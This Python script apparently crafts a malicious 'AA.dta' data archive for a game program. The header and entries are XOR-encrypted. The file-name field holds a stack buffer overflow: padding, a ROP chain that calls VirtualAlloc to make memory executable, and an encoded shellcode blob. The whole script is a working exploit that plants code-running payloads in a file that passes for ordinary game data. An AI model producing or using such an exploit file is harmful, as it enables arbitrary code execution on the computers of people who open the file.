import struct

# key for aa.dta file
key1 = 0xd4ad90c6 ^ 0x39475694
key2 = 0x67da216e ^ 0x34985762

# Signature 'ISD0'
signature = struct.pack("<I", 0x30445349)

SIZE_TABLEENTRY = 4 + 4 + 4 + 16

def cypher(buf, key1, key2):
	out = ""
	for i in xrange(0, len(buf) / 4, 2):
		out += struct.pack("<I", key1 ^ (struct.unpack("<I", buf[i * 4:(i + 1) * 4])[0]))
		if (len(buf[(i + 1) * 4:(i + 2) * 4]) != 4):
			break
		out += struct.pack("<I", key2 ^ (struct.unpack("<I", buf[(i + 1) * 4:(i + 2) * 4])[0]))
	return out

def craftdta():
	fdout = open("AA.dta", "wb")
	# SIGNATURE
	fdout.write(signature)

	# HEADER
	nbentry = struct.pack("<I", 0xCD7)
	offsettable = struct.pack("<I", 0x4 * 5)
	sizetable = struct.pack("<I", SIZE_TABLEENTRY * 1)
	unknow0C = struct.pack("<I", 0xFFDD6290)
	header = cypher(nbentry + offsettable + sizetable + unknow0C, key1, key2)
	fdout.write(header)

	# TableEntry
	totalsum = struct.pack("<I", 0x120527)
	offsetstart = struct.pack("<I", 0x4 * 5 + SIZE_TABLEENTRY * 1)
	offsetend = struct.pack("<I", 0x3C91)
	name = "BLES\EFFECTS.TBL"
	tableentry = cypher(totalsum + offsetstart + offsetend + name, key1, key2)
	fdout.write(tableentry)

	# PAYLOAD

	payload = "A" * 519 + "\x00" 		# fuck the _strupr()...
	gadgets = struct.pack('<I', 0x006281e0)	# [0x6281e0] pop eax;ret
	gadgets += struct.pack('<I', 0x42424242)# DUMMY // Because of retn 4
	gadgets += struct.pack('<I',0x0063b0f4)	# ptr to &VirtualAlloc()
	gadgets += struct.pack('<I',0x005c8500)	# push eax ; pop esi ; retn
	gadgets += struct.pack('<I',0x00634ab0)	# [0x634ab0] pop ebp;ret
	gadgets += struct.pack('<I',0x0059458d)	# jmp esp
	gadgets += struct.pack('<I',0x00521e54)	# [0x521e54] pop ebx;ret
	gadgets += struct.pack('<I',0x00000400)	# ebx = len(shellcode)
	gadgets += struct.pack('<I',0x0062867e)	# [0x62867e] pop edx;ret
	gadgets += struct.pack('<I',0x00001000)	# edx = MEM_COMMIT
	gadgets += struct.pack('<I',0x0057d96a)	# [0x57d96a] pop ecx;ret 
	gadgets += struct.pack('<I',0x00000040)	# ecx = PAGE_EXECUTE_READWRITE
	gadgets += struct.pack('<I',0x0048f328)	# [0x48f328] pop edi;ret
	gadgets += struct.pack('<i',0x004F57D3)	# retn
	gadgets += struct.pack('<I',0x0062830b)	# [0x62830b] pop eax;ret 
	gadgets += struct.pack('<I',0x90909090)	# ret
	gadgets += struct.pack('<I',0x0040d325)	# pushad ; retn

	shellcode = "\x90" * 20 + "\xd9\xf6\xba\x24\xb5\x20\x67\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1\x38\x31\x57\x17\x03\x57\x17\x83\xcb\x49\xc2\x92\xef\x5a\x8a\x5d\x0f\x9b\xed\xd4\xea\xaa\x3f\x82\x7f\x9e\x8f\xc0\x2d\x13\x7b\x84\xc5\xa0\x09\x01\xea\x01\xa7\x77\xc5\x92\x09\xb8\x89\x51\x0b\x44\xd3\x85\xeb\x75\x1c\xd8\xea\xb2\x40\x13\xbe\x6b\x0f\x86\x2f\x1f\x4d\x1b\x51\xcf\xda\x23\x29\x6a\x1c\xd7\x83\x75\x4c\x48\x9f\x3e\x74\xe2\xc7\x9e\x85\x27\x14\xe2\xcc\x4c\xef\x90\xcf\x84\x21\x58\xfe\xe8\xee\x67\xcf\xe4\xef\xa0\xf7\x16\x9a\xda\x04\xaa\x9d\x18\x77\x70\x2b\xbd\xdf\xf3\x8b\x65\xde\xd0\x4a\xed\xec\x9d\x19\xa9\xf0\x20\xcd\xc1\x0c\xa8\xf0\x05\x85\xea\xd6\x81\xce\xa9\x77\x93\xaa\x1c\x87\xc3\x12\xc0\x2d\x8f\xb0\x15\x57\xd2\xde\xe8\xd5\x68\xa7\xeb\xe5\x72\x87\x83\xd4\xf9\x48\xd3\xe8\x2b\x2d\x2b\xa3\x76\x07\xa4\x6a\xe3\x1a\xa9\x8c\xd9\x58\xd4\x0e\xe8\x20\x23\x0e\x99\x25\x6f\x88\x71\x57\xe0\x7d\x76\xc4\x01\x54\x15\xd0\xa1\x20\xb3\x4a\x3e\xa0\x34\xe1\xe2\x4d\xc2\x76\x6f\xd7\x59\x4b\xbd\x4b\xc1\xca\xad\x10\x2b\x69\x56\xb2\x33"
	shellcode += "\x90" * (400 - len(shellcode))
	
	
	payload += gadgets + shellcode


	# FileEntry
	Totalsize = struct.pack("<I", 0x0)
	unknow04 = struct.pack("<I", 0x0)
	unknow08 = struct.pack("<I", 0x0)
	unknow0C = struct.pack("<I", 0x0)
	filesize = struct.pack("<I", 0x1000)
	nbblock = struct.pack("<I", 0x0)
	Namelen = struct.pack("<I", len(payload))
	unknow1C = struct.pack("<I", 0)
	fileentry = cypher(Totalsize + unknow04 + unknow08 + unknow0C + filesize + nbblock + Namelen + unknow1C, key1, key2)
	fdout.write(fileentry)
	cyphpayload = cypher(payload, key1, key2)
	fdout.write(cyphpayload)
	fdout.close()

def main():
	craftdta()

if __name__ == '__main__':
	main()

